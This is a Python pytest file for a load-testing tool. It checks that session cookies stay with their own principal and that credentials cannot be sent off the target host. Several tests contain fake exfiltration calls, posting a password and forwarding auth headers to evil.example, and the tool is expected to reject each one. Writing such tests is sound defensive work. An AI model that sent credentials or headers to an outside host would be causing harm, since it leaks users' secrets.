"""No principal's cookie, token or credential reaches another principal or leaves the target."""

from __future__ import annotations

import secrets

import httpx
import pytest

from forze.base.exceptions import CoreException
from forze_load import Call, ClosedRamp, LoadPlan, Principal, Scenario, password_login, run

pytestmark = pytest.mark.unit

# ----------------------- #


class _App:
    """Sets a session cookie on ``/login`` and records every request's cookie and caller."""

    def __init__(self) -> None:
        self.requests: list[httpx.Request] = []

    async def handler(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)

        if request.url.path == "/login":
            return httpx.Response(200, headers={"Set-Cookie": "session=ada-secret; Path=/"})

        return httpx.Response(200)

    def cookies_sent_by(self, tenant: str) -> list[str]:
        return [
            request.headers["cookie"]
            for request in self.requests
            if request.headers.get("x-tenant-id") == tenant and "cookie" in request.headers
        ]


async def _cookie_login(call: Call) -> httpx.Response:
    return await call.request("POST", "/login")


async def _read(call: Call) -> httpx.Response:
    return await call.request("GET", "/items")


def _plan(*principals: Principal, scenarios: list[Scenario] | None = None) -> LoadPlan:
    return LoadPlan(
        base_url="http://127.0.0.1:9",
        principals=list(principals),
        scenarios=scenarios
        or [Scenario("login", _cookie_login, writes=False), Scenario("read", _read, writes=False)],
    )


# ....................... #


class TestCookies:
    async def test_a_cookie_set_for_one_principal_never_reaches_another(self) -> None:
        app = _App()
        plan = _plan(
            Principal(name="ada", mix={"login": 1}, tenant="ada"),
            Principal(name="bob", mix={"read": 1}, tenant="bob"),
        )

        await run(
            plan, ClosedRamp(steps=[2], step_s=0.3), transport=httpx.MockTransport(app.handler)
        )

        assert any(r.url.path == "/login" for r in app.requests)
        assert app.cookies_sent_by("bob") == []
        assert app.cookies_sent_by("ada") == []  # no jar: a cookie is only ever sent explicitly

    async def test_a_credential_callable_shares_no_cookie_either(self) -> None:
        app = _App()

        async def ada_signs_in(client: httpx.AsyncClient) -> dict[str, str]:
            await client.post("/login")

            return {}

        async def bob_signs_in(client: httpx.AsyncClient) -> dict[str, str]:
            await client.get("/whoami", headers={"X-Tenant-Id": "bob"})

            return {}

        plan = _plan(
            Principal(name="ada", mix={"read": 1}, tenant="ada", auth=ada_signs_in),
            Principal(name="bob", mix={"read": 1}, tenant="bob", auth=bob_signs_in),
        )

        await run(
            plan, ClosedRamp(steps=[2], step_s=0.2), transport=httpx.MockTransport(app.handler)
        )

        assert app.cookies_sent_by("bob") == []


class TestTarget:
    @pytest.mark.parametrize(
        ("field", "value"),
        [
            ("login_path", "https://evil.example/login"),
            ("refresh_path", "//evil.example/refresh"),
        ],
    )
    def test_a_credential_route_with_a_host_is_refused(self, field: str, value: str) -> None:
        with pytest.raises(CoreException) as error:
            password_login("ada", password_env="LOAD_PW", **{field: value})

        assert error.value.code == "load_plan_invalid"

    async def test_a_credential_callable_cannot_post_off_target(self, monkeypatch) -> None:
        monkeypatch.setenv("LOAD_PW", secrets.token_hex(8))
        app = _App()

        async def leaky(client: httpx.AsyncClient) -> dict[str, str]:
            await client.post("https://evil.example/token", json={"password": "x"})

            return {}

        with pytest.raises(CoreException) as error:
            await run(
                _plan(Principal(name="ada", mix={"read": 1}, auth=leaky)),
                ClosedRamp(steps=[1], step_s=0.2),
                transport=httpx.MockTransport(app.handler),
            )

        assert error.value.code == "load_plan_invalid"
        assert app.requests == []

    async def test_a_scenario_using_the_client_directly_cannot_leave(self) -> None:
        app = _App()

        async def direct(call: Call) -> httpx.Response:
            return await call.client.get("https://evil.example/x", headers=dict(call.headers))

        with pytest.raises(CoreException) as error:
            await run(
                _plan(
                    Principal(name="ada", mix={"direct": 1}),
                    scenarios=[Scenario("direct", direct, writes=False)],
                ),
                ClosedRamp(steps=[1], step_s=0.2),
                transport=httpx.MockTransport(app.handler),
            )

        assert error.value.code == "load_plan_invalid"
        assert app.requests == []

    async def test_a_full_url_on_the_same_origin_is_allowed(self) -> None:
        app = _App()

        async def explicit(call: Call) -> httpx.Response:
            return await call.client.get("http://127.0.0.1:9/items")

        await run(
            _plan(
                Principal(name="ada", mix={"x": 1}),
                scenarios=[Scenario("x", explicit, writes=False)],
            ),
            ClosedRamp(steps=[1], step_s=0.1),
            transport=httpx.MockTransport(app.handler),
        )

        assert app.requests
